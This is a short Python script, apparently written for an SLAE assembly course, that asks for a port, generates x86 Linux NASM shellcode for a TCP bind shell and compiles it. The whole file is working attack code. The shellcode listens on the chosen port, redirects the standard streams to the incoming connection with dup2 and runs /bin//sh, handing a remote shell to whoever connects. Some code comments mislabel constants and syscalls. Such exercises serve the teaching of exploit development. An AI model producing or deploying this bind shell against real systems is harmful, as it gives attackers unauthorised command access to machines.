#!/usr/bin/python
# Author: Eric Van Zutphen
# Filename: bind.py
# SLAE - 1140

import sys, struct, subprocess

def write():
        shellcode_file = open("shell.nasm", "w")
        port = raw_input("Please enter a port 1-65535: ")
        x = int(port)
        port = struct.unpack('<H',struct.pack('>H',x))[0]
        port = hex(port)

        shellcode = """global _start

_start:

        jmp long call_bind_shell

bind_shell:

        pop edx

; Socket
        push 0x6 ; tcp
        push 0x1 ; sock_raw
        push 0x2 ; af_inet
        mov al, 0x66 ; socket_call into eax
        mov bl, 0x1 ; sys_socket
        mov ecx, esp
        int 0x80

        mov esi, eax ; save sockfd

; Bind
        mov ebx, eax ; 0x3 into ebx
        xor eax, ebx ;zero out eax
        mov dword [esp-1], eax
        sub esp, 4 ; listen on 0.0.0.0
        mov ebx, eax ; zero out ebx
        push dword %s ; configurable port
        push word 0x2 ; af_inet
        mov ecx, esp ;address from esp in ecx
        push 0x10
        push ecx ; address for esp
        push esi ; sockfd on the stack
        mov al, 0x66 ;socketcall
        mov bl, 0x2 ; sys_bind in bl
        mov ecx, esp ; address for esp into ecx
        int 0x80

; Listen
        push 0x1 ; backlog maximum queue of connections
        push esi ; sockfd
        mov al, 0x66 ; socket_call into al
        mov bl, 0x4 ; sys_listen into bl
        mov ecx, esp ; esp address into ecx
        int 0x80


; Accept
        push eax ; null
        push esi ; sockfd
        mov al, 0x66 ; socket_call into al
        mov bl, 0x5 ; sys_listen in bl
        mov ecx, esp ; esp address into ecx
        int 0x80
        mov esi, eax

; Dup2
        xor ecx, ecx
        mov cl, 0x3 ; three loops

duploop:

        dec cl ; stderr, stdout, stdin loop decrement
        mov al, 0x3f ; dup2 into al
        mov ebx, esi ; mov 4 into ebx
        int 0x80
        mov esi, eax
        jnz duploop


; execve

        mov eax, ecx
        xor ecx, eax
        push ecx
        mov dword [esp-4], 0x68732f6e ; ascii hs/n
        mov dword [esp-8], 0x69622f2f ; ascii ib//
        sub esp, 8
        mov ebx, esp
        push ecx
        push ebx
        mov al, 0xb ; execve syscall
        mov ecx, esp
        xor edx, edx
        int 0x80

call_bind_shell:
        call bind_shell""" %port

        shellcode_file.write(shellcode)
write()

def compile():
        compiler = subprocess.Popen(('nasm -f elf32 -o shell.o shell.nasm'),shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        (compiler_stdout_result, compiler_stderr_result) = compiler.communicate()
        linker = subprocess.Popen(('ld -o shell shell.o'),shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        (linker_stdout_result, linker_stderr_result) = linker.communicate()
compile()